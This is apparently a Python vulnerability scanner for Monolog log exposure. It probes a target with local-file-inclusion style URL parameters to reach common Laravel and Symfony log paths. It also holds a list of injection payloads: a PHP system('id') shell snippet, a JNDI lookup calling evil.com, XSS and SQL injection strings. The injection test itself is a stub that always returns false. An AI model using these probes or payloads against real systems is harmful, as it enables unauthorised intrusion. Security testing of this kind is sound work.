import re
import json
import requests

class MonologHijackScanner:
    def __init__(self, target):
        self.target = target
        self.vulnerabilities = []
        
    def scan(self):
        """Scan for Monolog Hijack vulnerabilities"""
        print(f"[Monolog] Scanning {self.target}...")
        
        # Check common Monolog paths
        paths = [
            "/var/log/symfony.log",
            "/app/logs/prod.log",
            "/var/logs/app.log",
            "/storage/logs/laravel.log",
            "/log/application.log",
            "/tmp/monolog.log"
        ]
        
        for path in paths:
            if self._check_log_file(path):
                self.vulnerabilities.append({
                    'type': 'Log File Disclosure',
                    'path': path,
                    'severity': 'MEDIUM'
                })
                
        # Check log injection
        if self._test_log_injection():
            self.vulnerabilities.append({
                'type': 'Log Injection',
                'details': 'Can inject malicious content into logs',
                'severity': 'LOW'
            })
            
        return {
            "target": self.target,
            "vulnerabilities": self.vulnerabilities,
            "count": len(self.vulnerabilities),
            "risk_level": "MEDIUM" if self.vulnerabilities else "LOW"
        }
    
    def _check_log_file(self, path):
        """Check if log file is accessible"""
        try:
            # Try LFI style access
            test_urls = [
                f"{self.target}?file={path}",
                f"{self.target}?page={path}",
                f"{self.target}?load={path}",
                f"{self.target}?path={path}"
            ]
            
            for url in test_urls:
                response = requests.get(url, timeout=5)
                
                # Check for log indicators
                indicators = [
                    'INFO', 'ERROR', 'WARNING', 'DEBUG',
                    'CRITICAL', 'ALERT', 'EMERGENCY',
                    'Stack trace:', 'exception'
                ]
                
                for indicator in indicators:
                    if indicator in response.text:
                        return True
                        
        except Exception:
            pass
            
        return False
    
    def _test_log_injection(self):
        """Test log injection vulnerability"""
        injection_payloads = [
            '\n\nINJECTED LINE\n',
            '<?php system("id"); ?>',
            '${jndi:ldap://evil.com/a}',
            '<script>alert(1)</script>',
            '"; DROP TABLE users; --'
        ]
        
        # This would require a way to trigger log entries
        # Simplified for demonstration
        return False